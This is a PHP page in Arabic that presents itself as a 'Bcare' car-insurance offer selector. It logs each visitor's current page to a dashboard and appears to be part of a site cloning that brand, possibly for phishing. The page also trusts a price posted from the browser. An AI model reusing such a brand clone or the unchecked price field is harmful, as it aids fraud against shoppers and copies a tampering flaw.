<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'أنواع التأمين');
}

if (isset($_POST['submit'])) {
    $_SESSION['totalprice'] = $_POST['totalprice'];
    $_SESSION['image'] = $_POST['image'];
    echo "<script>document.location.href='summary.php';</script>";
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختر نوع التأمين | بي كير</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-color: #156394;
            --secondary-color: #f9a824;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-light);
            color: var(--text-dark);
            min-height: 100vh;
        }

        .navbar {
            background: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .type-tabs {
            background: white;
            padding: 10px;
            border-radius: 50px;
            display: flex;
            gap: 5px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
        }

        .type-tab {
            flex: 1;
            padding: 12px;
            border-radius: 40px;
            text-align: center;
            cursor: pointer;
            font-weight: 700;
            transition: all 0.3s;
            color: #64748b;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .type-tab.active {
            background: var(--primary-color);
            color: white;
            box-shadow: 0 5px 15px rgba(21, 99, 148, 0.3);
        }

        .offer-card {
            background: white;
            border-radius: 24px;
            margin-bottom: 30px;
            overflow: hidden;
            border: 1px solid rgba(0, 0, 0, 0.05);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.03);
            transition: transform 0.3s;
        }

        .offer-card:hover {
            transform: translateY(-5px);
        }

        .offer-header {
            padding: 20px;
            background: #fdfdfd;
            border-bottom: 1px solid #f1f5f9;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .offer-header img {
            height: 40px;
            object-fit: contain;
        }

        .offer-body {
            padding: 25px;
        }

        .benefit-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            font-size: 0.9rem;
        }

        .installment-badge {
            background: #f8fafc;
            border: 1px dashed #cbd5e1;
            border-radius: 12px;
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: 20px;
        }

        .offer-footer {
            padding: 20px 25px;
            background: #f8fafc;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 20px;
        }

        .price-tag {
            text-align: left;
        }

        .price-val {
            font-size: 1.5rem;
            font-weight: 900;
            color: var(--primary-color);
        }

        .price-label {
            font-size: 0.75rem;
            color: #94a3b8;
            font-weight: 700;
        }

        .btn-buy {
            background: var(--secondary-color);
            color: white;
            border-radius: 12px;
            padding: 12px 30px;
            font-weight: 900;
            text-decoration: none;
            border: none;
            transition: all 0.3s;
        }

        .btn-buy:hover {
            background: #e8951a;
            box-shadow: 0 8px 15px rgba(249, 168, 36, 0.2);
        }
    </style>
</head>

<body>

    <nav class="navbar text-center">
        <div class="container">
            <a href="index.php"><img src="./assets/Bcare-logo.svg" alt="Bcare" height="40"></a>
        </div>
    </nav>

    <main class="container py-4">
        <div class="type-tabs mb-5">
            <div class="type-tab active" onclick="switchType(1, this)">
                <img src="./assets/q-icon-3.svg" width="24"> <span>ضد الغير</span>
            </div>
            <div class="type-tab" onclick="switchType(2, this)">
                <img src="./assets/car-crash-plus.svg" width="24"> <span>مميز</span>
            </div>
            <div class="type-tab" onclick="switchType(3, this)">
                <img src="./assets/q-icon-2.svg" width="24"> <span>شامل</span>
            </div>
        </div>

        <div id="offersContainer" class="row">
            <!-- Dynamically populated -->
        </div>
    </main>

    <script>
        function switchType(id, el) {
            document.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
            el.classList.add('active');
            renderOffers(id);
        }

        async function renderOffers(typeId) {
            try {
                const res = await fetch('data.json');
                const data = await res.json();
                const container = document.getElementById('offersContainer');
                container.innerHTML = '';

                const category = data.find(c => c.id == typeId);
                category.data.forEach(item => {
                    const html = `
                        <div class="col-lg-6">
                            <div class="offer-card">
                                <div class="offer-header">
                                    <img src="./assets/${item.img}" alt="Company">
                                    <span class="badge bg-light text-primary fw-bold px-3 py-2 rounded-pill">${item.title}</span>
                                </div>
                                <div class="offer-body">
                                    <h6 class="fw-bold mb-3"><i class="bi bi-plus-circle-fill text-primary me-1"></i> المنافع الإضافية</h6>
                                    <div class="benefits-list">
                                        ${item.extra.map(ex => `
                                            <div class="benefit-item">
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" ${ex.clicked ? 'checked disabled' : ''} onchange="recalculate(${item.id}, ${ex.price || 0}, this)">
                                                    <label class="form-check-label small fw-bold">${ex.title}</label>
                                                </div>
                                                <span class="fw-bold text-muted small">${ex.price ? ex.price + ' ريال' : 'مشمولة'}</span>
                                            </div>
                                        `).join('')}
                                    </div>

                                    
                                </div>
                                <div class="offer-footer">
                                    <div class="price-tag">
                                        <div class="price-label text-end">الإجمالي شامل الضريبة</div>
                                        <div class="price-val" id="priceDisplay_${item.id}">${item.totalprice} <span style="font-size: 1rem;">ريال</span></div>
                                    </div>
                                    <form action="" method="POST">
                                        <input type="hidden" name="totalprice" id="priceInput_${item.id}" value="${item.totalprice}">
                                        <input type="hidden" name="image" value="${item.img}">
                                        <button type="submit" name="submit" class="btn-buy">اشتري الآن <i class="bi bi-chevron-left ms-1"></i></button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    `;
                    container.insertAdjacentHTML('beforeend', html);
                });
            } catch (e) { console.error(e); }
        }

        function recalculate(itemId, price, checkbox) {
            const input = document.getElementById('priceInput_' + itemId);
            const display = document.getElementById('priceDisplay_' + itemId);
            let total = parseFloat(input.value);
            if (checkbox.checked) total += price;
            else total -= price;
            input.value = total.toFixed(2);
            display.innerHTML = `${total.toFixed(2)} <span style="font-size: 1rem;">ريال</span>`;
        }

        document.addEventListener('DOMContentLoaded', () => renderOffers(1));
    </script>
    <?php include 'chat_widget.php'; ?>

    <!-- <div class="installment-badge">
        <img src="./assets/Tabby-ar.svg" width="60">
        <div class="small fw-bold text-muted">
            قسطها على 4 دفعات بقيمة <span class="text-primary">${(item.totalprice/4).toFixed(2)} ريال</span> بدون فوائد
        </div>
    </div> -->
</body>

</html>